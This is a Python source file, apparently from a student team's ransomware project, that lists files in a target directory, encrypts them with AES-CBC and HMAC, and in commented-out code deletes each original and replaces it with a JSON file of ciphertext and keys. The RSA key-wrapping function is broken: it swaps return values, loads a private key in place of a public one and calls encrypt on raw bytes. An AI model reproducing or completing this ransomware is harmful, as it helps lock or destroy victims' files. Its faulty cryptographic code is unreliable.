import os
import sys
import json
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives import (padding, hashes, hmac)
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

fileToEncrypt = 'image.jpg'
root = "C:/Users/Hanson/Desktop/Team-1/RansomWare/TestFiles"
path = os.path.join(root, "targetdirectory")

def FindFiles(root, path):
    # Search through directory
    for path, subdirs, files in os.walk(root):
        for name in files:
            print(os.path.join(path, name))
    return 0

FindFiles(root, path)

def MyFileEncrypt(filepath):
    ext = getExtension(filepath)
    file = open(filepath, "rb")
    fileBytes = file.read()
    key = os.urandom(16)
    hkey = os.urandom(16)
    cipherText, iv, tag = MyEncryptMac(fileBytes, key, hkey)
    return cipherText, tag, iv, key, ext, hkey

def MyRSAEncrypt(filepath, RSA_Publickey_filepath):
    C, IV, tag, EncKey, HMACKey, ext = MyFileEncrypt(filepath)
    #Initalize RSA Public Key Encryption Object
    private_key = rsa.generate_private_key(
        public_exponent = 65537,
        key_size=2048,
        backend=default_backend()
    )

    # Load pem pulickey from RSA_Publickey_filepath
    with open(RSA_Publickey_filepath, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )

    key = EncKey + HMACKey
    RSACipher = key.encrypt(
        C,
        padding.OAEP(
           mgf=padding.MGF1(algorithm=hashes.SHA256()),
           algorithm=hashes.SHA256(),
           label=None
        )
    )
    return (RSACipher, C, IV, tag, ext)

def MyEncryptMac(message, EncKey, HMACKey):
    padder = padding.PKCS7(128).padder()
    paddedToEncrypt = padder.update(message)
    paddedToEncrypt += padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(EncKey), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    #buffer = bytearray((len(message) + 32 -1 ))
    #encrypted = encryptor.update_into(paddedToEncrypt, buffer)
    cipherText = (encryptor.update(paddedToEncrypt) + encryptor.finalize())
    # Create tag object
    t = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    # Create tag from ciphertext
    t.update(cipherText)
    # Get the tag as bytes
    tag = t.finalize()
    return cipherText, iv, tag

# def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):
#     C, IV, tag, EncKey, HMACKey, ext = MyFileEncrypt(filepath)
#     #Initalize RSA Public Key Encryption Object
#     private_key = rsa.generate_private_key(
#         public_exponent = 65537,
#         key_size=2048,
#         backend=default_backend()
#     )
#
#     # Load pem pulickey from RSA_Publickey_filepath
#     with open(RSA_Publickey_filepath, "rb") as key_file:
#         private_key = serialization.load_pem_private_key(
#             key_file.read(),
#             password=None,
#             backend=default_backend()
#         )
#
#     key = EncKey + HMACKey
#     RSACipher = key.encrypt(
#         C,
#         padding.OAEP(
#            mgf=padding.MGF1(algorithm=hashes.SHA256()),
#            algorithm=hashes.SHA256(),
#            label=None
#         )
#     )
#     return (RSACipher, C, IV, tag, ext)

def MyFileDecrypt(filename):
    # Decrypt the file
    decryptThis = open(filename, "r")
    fileContents = decryptThis.read()
    jsonUndone = json.loads(fileContents)

    citBytes = jsonUndone["cipherText"].encode('ISO-8859-1')
    key = jsonUndone["key"].encode('ISO-8859-1')
    iv = jsonUndone["iv"].encode('ISO-8859-1')
    tag = jsonUndone["tag"].encode('ISO-8859-1')
    HMACKey = jsonUndone["HMACKey"].encode('ISO-8859-1')
    ext = jsonUndone["extension"]
    print(type(HMACKey))

    print("HMACKEY After: ", HMACKey)

    message = MyDecrypt(citBytes, key, iv, tag, HMACKey)
    return message, ext

def MyDecrypt(cipherText, key, iv, tag, HMACKey):
    # Create a tag from the ciphertext
    tag2 = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
    tag2.update(cipherText)
    try:
        # Verify that the cipherText tag that was generated matches the tag that was created for the original message
        tag2.verify(tag)
        print("The file is unmodified, the MACs match")
    except:
        # The tags did not match, the file has been modified
        print("The file has been modified, the MACs do not match.")
        quit()

    # The tags matched, continue with decryption
    # Create the cipher
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    # Create a decryptor
    decryptor = cipher.decryptor()
    # Pass the ciphertext through the decryptor and get all of the data out of the decryptor using finalize
    string = decryptor.update(cipherText) + decryptor.finalize()
    # Remove padding
    unpadder = padding.PKCS7(128).unpadder()
    unpadded = unpadder.update(string)
    unpadded += unpadder.finalize()

    # Return unpadded message
    return unpadded



def getExtension(filepath):
    return os.path.splitext(filepath)[1]

#
# cit, tag, iv, key, ext, hkey = MyFileEncrypt(fileToEncrypt)
# # # Optionally encrypt a separate file to have a tag to test the decryption verification
# # # cit2, tag2, iv2, key2, ext2, hkey2 = MyFileEncrypt("testText2.txt")
#
# #Create JSON formatted data
# jsonData = {}
# jsonData['cipherText'] = cit.decode('ISO-8859-1')
# jsonData['tag'] = tag.decode('ISO-8859-1')
# jsonData['iv'] = iv.decode('ISO-8859-1')
# jsonData['key'] = key.decode('ISO-8859-1')
# jsonData['extension'] = ext
# jsonData['HMACKey'] = hkey.decode('ISO-8859-1')
#
# # Dump the JSON data into the object
# jsonObj = json.dumps(jsonData)
# # Delete original file
# os.remove(fileToEncrypt)
# # Create encrypted json file named the same as the original file with different extension
# fileName = os.path.splitext(fileToEncrypt)[0] + ".json"
# f = open(fileName, "w")
# f.write(jsonObj)
# f.close()


# message, ext = MyFileDecrypt(fileName)
# newFileName = "decrypted" + ext
# newFile = open(newFileName, "wb")
# # Write the message to the file
# newFile.write(message)

